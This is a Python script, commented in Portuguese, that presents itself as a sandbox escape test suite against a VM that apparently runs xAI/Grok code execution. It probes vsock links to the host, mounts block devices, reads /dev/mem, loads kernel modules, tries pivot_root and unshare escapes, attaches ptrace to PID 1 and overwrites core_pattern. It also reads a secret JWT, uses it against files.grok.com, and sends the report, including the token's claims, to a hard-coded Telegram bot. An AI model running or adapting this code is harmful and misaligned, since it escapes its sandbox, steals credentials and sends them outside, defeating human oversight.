#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Sandbox Escape Test Suite - Versão Completa
Executa testes de escape na VM Hades (xAI/Grok) e envia relatório para o Telegram.
Autor: Wanderson (adaptado)
Data: 2026-08-29
"""

import os
import sys
import subprocess
import time
import json
import hashlib
import socket
import base64
import requests
from datetime import datetime, timezone
from pathlib import Path

# =================== CONFIGURAÇÃO ===================
BOT_TOKEN = "8870734086:AAF_9CQIn-xO-5dd-npb4k_wvYs-QShmxi4"
CHAT_ID = "230885588"
LOG_FILE = "/tmp/escape_test_full.log"
TIMEOUT_CMD = 15          # timeout padrão para comandos shell
TIMEOUT_NET = 5           # timeout para requisições de rede
# ====================================================

# Lista global para acumular linhas do log
log_lines = []

def add_log(msg=""):
    """Adiciona uma linha ao log e imprime no console."""
    log_lines.append(str(msg))
    print(msg)

def sh(cmd, timeout=TIMEOUT_CMD):
    """Executa um comando shell e retorna a saída (stdout+stderr)."""
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        return f"(TIMEOUT após {timeout}s) comando: {cmd}"
    except Exception as e:
        return f"(ERRO ao executar: {e})"

def file_read(path):
    """Lê o conteúdo de um arquivo, se existir."""
    try:
        with open(path, 'r') as f:
            return f.read()
    except Exception:
        return None

def file_exists(path):
    return os.path.exists(path)

# ============================================================
# SEÇÕES DE TESTE
# ============================================================

def section_header(title):
    add_log("\n" + "="*72)
    add_log(title)
    add_log("="*72)

# 1. IDENTIDADE
def test_identity():
    section_header("1. IDENTIDADE DO AMBIENTE")
    add_log(f"hostname: {socket.gethostname()}")
    add_log(f"uname: {sh('uname -a').strip()}")
    add_log(f"kernel cmdline: {sh('cat /proc/cmdline').strip()[:500]}")
    add_log("Tipo: VM Hades (xAI/Grok) sobre Cloud Hypervisor")
    add_log("Init: catatonit → xai-hades-charon (init + serve-ch-vsock)")

# 2. PRIVILÉGIOS
def test_privileges():
    section_header("2. PRIVILÉGIOS E CAPABILITIES")
    add_log(sh("id").strip())
    add_log("Capabilities (self):")
    add_log(sh("grep Cap /proc/self/status").strip())
    add_log("Capabilities (PID1):")
    add_log(sh("grep Cap /proc/1/status").strip())
    add_log("NoNewPrivs self: " + sh("grep NoNewPrivs /proc/self/status").strip())
    add_log("NoNewPrivs PID1: " + sh("grep NoNewPrivs /proc/1/status").strip())
    add_log("Seccomp: " + sh("grep -i seccomp /proc/self/status").strip())
    add_log("✅ Executando como root" if os.geteuid() == 0 else "⚠️  Não é root")

# 3. DISPOSITIVOS E FILESYSTEMS
def test_devices():
    section_header("3. DISPOSITIVOS E FILESYSTEMS")
    add_log("lsblk:")
    add_log(sh("lsblk").strip())
    add_log("\nDispositivos especiais:")
    add_log(sh("ls -la /dev/ | grep -E 'mem|kmem|port|kmsg|vsock|vda|vdb|vdc|vdd|vport'").strip())
    add_log("\nMontagens:")
    add_log(sh("cat /proc/mounts").strip())

# 4. VSOCK
def test_vsock():
    section_header("4. TESTE VSOCK (COMUNICAÇÃO COM HOST)")
    if not file_exists("/dev/vsock"):
        add_log("/dev/vsock NÃO encontrado")
        return
    add_log("/dev/vsock presente")
    # Tenta conectar em várias combinações
    for cid in [2, 3, 4]:
        for port in [22, 4242, 4243, 8080, 443, 80]:
            try:
                s = socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((cid, port))
                add_log(f"✅ CONEXÃO BEM-SUCEDIDA para CID {cid} porta {port}")
                s.close()
            except Exception:
                pass
    # Fuzzing básico no serviço charon (porta 4242)
    try:
        s = socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((2, 4242))
        s.send(b'{"method":"ping"}\n')
        resp = s.recv(1024)
        add_log(f"Resposta do vsock (CID2:4242): {resp[:200]}")
        s.close()
    except Exception as e:
        add_log(f"Falha ao comunicar com vsock: {e}")

# 5. MONTAGEM DE DISPOSITIVOS ADICIONAIS
def test_block_mount():
    section_header("5. TESTE DE MONTAGEM DE DISPOSITIVOS ADICIONAIS")
    for dev in ["/dev/vdc", "/dev/vdb", "/dev/vda"]:
        if not file_exists(dev):
            add_log(f"{dev} não existe")
            continue
        mnt = f"/tmp/mnt_{dev.replace('/','_')}"
        os.makedirs(mnt, exist_ok=True)
        out = sh(f"mount -t auto {dev} {mnt} 2>&1")
        if "mount" in out and ("permission" not in out.lower() and "bad option" not in out.lower()):
            add_log(f"✅ Montagem de {dev} bem-sucedida em {mnt}")
            add_log(f"Conteúdo (primeiros 20 itens):")
            add_log(sh(f"ls -la {mnt} | head -20").strip())
            # Tenta remontar como RW
            add_log(f"Tentando remontar {dev} como RW:")
            add_log(sh(f"mount -o remount,rw {dev} 2>&1").strip())
            sh(f"umount {mnt}")
        else:
            add_log(f"❌ Falha ao montar {dev}: {out[:200]}")

# 6. /dev/mem e /dev/kmem
def test_dev_mem():
    section_header("6. TESTE DE ACESSO A /dev/mem E /dev/kmem")
    for f in ["/dev/mem", "/dev/kmem"]:
        if not file_exists(f):
            add_log(f"{f} não existe")
            continue
        try:
            with open(f, 'rb') as fd:
                data = fd.read(1024)
            add_log(f"✅ Leitura de {f} bem-sucedida (primeiros 1024 bytes)")
            strings = data.decode('latin-1', errors='ignore').strip()
            add_log(f"Strings encontradas: {strings[:200]}")
        except Exception as e:
            add_log(f"❌ Erro ao ler {f}: {e}")
    # Leitura em offsets maiores
    add_log("\nLeitura de /dev/mem em offsets maiores:")
    for offset in [0x100000, 0x20000000, 0x40000000]:
        cmd = f"dd if=/dev/mem bs=1M skip={offset//1048576} count=1 2>/dev/null | strings | head -5"
        out = sh(cmd, timeout=10)
        if out.strip():
            add_log(f"Offset {hex(offset)}: {out[:200]}")

# 7. CARREGAMENTO DE MÓDULO
def test_module_loading():
    section_header("7. TESTE DE CARREGAMENTO DE MÓDULO KERNEL")
    disabled = file_read("/proc/sys/kernel/modules_disabled")
    if disabled and "0" in disabled:
        add_log("✅ Módulos habilitados (modules_disabled=0)")
        if sh("which gcc").strip():
            add_log("gcc encontrado, compilando módulo dummy")
            code = """
#include <linux/module.h>
#include <linux/kernel.h>
static int __init init(void) { printk(KERN_INFO "ESCAPE_MODULE_LOADED\\n"); return 0; }
static void __exit exit(void) { printk(KERN_INFO "ESCAPE_MODULE_UNLOADED\\n"); }
module_init(init);
module_exit(exit);
MODULE_LICENSE("GPL");
"""
            with open("/tmp/dummy.c", "w") as f:
                f.write(code)
            sh("cd /tmp && gcc -c dummy.c -o dummy.o 2>&1")
            if file_exists("/tmp/dummy.o"):
                out = sh("insmod /tmp/dummy.o 2>&1")
                if "Error" not in out:
                    add_log("✅ Módulo carregado com sucesso!")
                    add_log(sh("lsmod | grep dummy").strip())
                    sh("rmmod dummy 2>&1")
                else:
                    add_log(f"❌ Falha ao carregar módulo: {out[:200]}")
            else:
                add_log("Falha na compilação do módulo")
        else:
            add_log("gcc não encontrado, impossível compilar")
    else:
        add_log("❌ Módulos desabilitados (modules_disabled != 0)")

# 8. PIVOT_ROOT E OVERLAY
def test_pivot_root():
    section_header("8. TESTE DE PIVOT_ROOT / ESCAPE DO OVERLAY")
    os.makedirs("/tmp/newroot", exist_ok=True)
    os.makedirs("/tmp/oldroot", exist_ok=True)
    out = sh("pivot_root /tmp/newroot /tmp/oldroot 2>&1")
    if "pivot_root" in out and "success" not in out:
        add_log(f"pivot_root falhou: {out[:200]}")
        add_log("Tentando mount --move / /tmp/newroot")
        out2 = sh("mount --move / /tmp/newroot 2>&1")
        add_log(out2[:200])
    else:
        add_log("✅ pivot_root parece ter funcionado (cuidado!)")
        add_log("Listando /tmp/oldroot:")
        add_log(sh("ls -la /tmp/oldroot | head -20").strip())

    # Teste com unshare
    add_log("\nTeste com unshare -m:")
    out3 = sh("unshare -m bash -c 'mount --bind / /mnt && ls /mnt | head -5'")
    add_log(out3[:300])

# 9. FUSE GROK-FILES
def test_grok_fuse():
    section_header("9. TESTE DE FUSE GROK-FILES")
    add_log("Mount grok-files: " + sh("mount | grep grok-files").strip())
    if os.path.isdir("/home/workdir/artifacts"):
        add_log("Tentando criar links simbólicos para escape")
        try:
            os.symlink("/etc/passwd", "/home/workdir/artifacts/passwd_link")
            add_log("Link criado, tentando ler via FUSE:")
            add_log(sh("cat /home/workdir/artifacts/passwd_link 2>&1").strip()[:200])
            os.unlink("/home/workdir/artifacts/passwd_link")
        except Exception as e:
            add_log(f"Falha ao criar link: {e}")

# 10. PROCESSOS
def test_processes():
    section_header("10. PROCESSOS RELEVANTES")
    add_log(sh("ps aux --sort=-%mem | head -25").strip())

# 11. NAMESPACES
def test_namespaces():
    section_header("11. NAMESPACES")
    add_log(sh("ls -la /proc/self/ns/").strip())
    add_log("\nNamespaces do PID1:")
    add_log(sh("readlink /proc/1/ns/* 2>/dev/null").strip())

# 12. JWT
def test_jwt():
    section_header("12. JWT E SECRETS")
    jwt_path = "/etc/secrets/terminal.jwt"
    if not file_exists(jwt_path):
        add_log("JWT não encontrado")
        return
    jwt = file_read(jwt_path)
    if not jwt:
        add_log("JWT vazio")
        return
    add_log(f"JWT lido de {jwt_path} (tamanho {len(jwt)})")
    try:
        parts = jwt.split(".")
        if len(parts) >= 2:
            header = json.loads(base64.urlsafe_b64decode(parts[0] + "=" * (-len(parts[0]) % 4)))
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=" * (-len(parts[1]) % 4)))
            add_log(f"Header: {header}")
            add_log("Claims:")
            for k, v in payload.items():
                if k in ("exp", "iat"):
                    add_log(f"  {k}: {v} ({datetime.fromtimestamp(v, tz=timezone.utc).isoformat()})")
                else:
                    add_log(f"  {k}: {v}")
    except Exception as e:
        add_log(f"Erro ao decodificar JWT: {e}")

# 13. API FILES.GROK.COM
def test_files_api():
    section_header("13. TESTE DE ACESSO À API FILES.GROK.COM")
    jwt = os.environ.get("TERMINAL_JWT_VAL") or file_read("/etc/secrets/terminal.jwt")
    if not jwt:
        add_log("Sem JWT disponível")
        return
    headers = {"Authorization": f"Bearer {jwt}"}
    endpoints = ["/api/v1/files", "/api/v1/projects", "/api/v1/list", "/api/v1/me"]
    for endpoint in endpoints:
        url = f"https://files.grok.com{endpoint}"
        try:
            r = requests.get(url, headers=headers, timeout=TIMEOUT_NET)
            add_log(f"Endpoint {endpoint}: status {r.status_code} - {r.text[:100]}")
        except Exception as e:
            add_log(f"Endpoint {endpoint} falhou: {e}")

# 14. TESTE ADICIONAL: PTRACE
def test_ptrace():
    section_header("14. TESTE DE PTRACE")
    # Tenta anexar a um processo qualquer (ex: PID 1)
    out = sh("gdb -p 1 --batch -ex 'info reg' 2>&1")
    if "ptrace" in out and "Operation not permitted" in out:
        add_log("❌ ptrace bloqueado (grok-killguard ativo)")
    else:
        add_log("✅ ptrace possivelmente permitido (saída):")
        add_log(out[:300])

# 15. TESTE DE ESCRITA EM /proc
def test_proc_write():
    section_header("15. TESTE DE ESCRITA EM /proc (sysctl)")
    # Tenta modificar algo simples (ex: core_pattern)
    out = sh("echo '|/tmp/exploit' > /proc/sys/kernel/core_pattern 2>&1")
    if "Permission denied" in out or "Read-only" in out:
        add_log("❌ Escrita em /proc bloqueada")
    else:
        add_log("✅ Escrita em /proc possivelmente permitida (cuidado!)")
        add_log(out[:200])

# ============================================================
# FUNÇÃO PRINCIPAL
# ============================================================
def main():
    add_log("="*72)
    add_log("RELATÓRIO COMPLETO DE TESTES DE ESCAPE")
    add_log(f"Gerado em: {datetime.now(timezone.utc).isoformat()}")
    add_log("Escopo: VM Hades (xAI/Grok) - análise interna")
    add_log("="*72)

    # Executa todas as seções
    test_identity()
    test_privileges()
    test_devices()
    test_vsock()
    test_block_mount()
    test_dev_mem()
    test_module_loading()
    test_pivot_root()
    test_grok_fuse()
    test_processes()
    test_namespaces()
    test_jwt()
    test_files_api()
    test_ptrace()
    test_proc_write()

    # Rodapé
    add_log("\n" + "="*72)
    add_log("FIM DO RELATÓRIO")
    add_log("="*72)

    # Escreve arquivo de log
    full_log = "\n".join(log_lines)
    with open(LOG_FILE, "w", encoding="utf-8") as f:
        f.write(full_log)

    print(f"\nLog salvo em {LOG_FILE} (tamanho: {len(full_log)} bytes)")

    # Envia para o Telegram
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with open(LOG_FILE, 'rb') as f:
            files = {'document': (os.path.basename(LOG_FILE), f, 'text/plain')}
            data = {'chat_id': CHAT_ID, 'caption': f'Escape Test Report - {datetime.now().isoformat()}'}
            response = requests.post(url, files=files, data=data, timeout=30)
        if response.status_code == 200:
            print("✅ Relatório enviado com sucesso para o Telegram!")
        else:
            print(f"❌ Falha ao enviar: {response.status_code} - {response.text}")
            # Fallback: enviar como mensagem de texto
            url_text = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            payload = {'chat_id': CHAT_ID, 'text': full_log[:4000]}
            resp = requests.post(url_text, json=payload, timeout=30)
            if resp.status_code == 200:
                print("✅ Log enviado como mensagem de texto (fallback)")
            else:
                print(f"❌ Fallback também falhou: {resp.text}")
    except Exception as e:
        print(f"Erro no envio para Telegram: {e}")

if __name__ == "__main__":
    main()
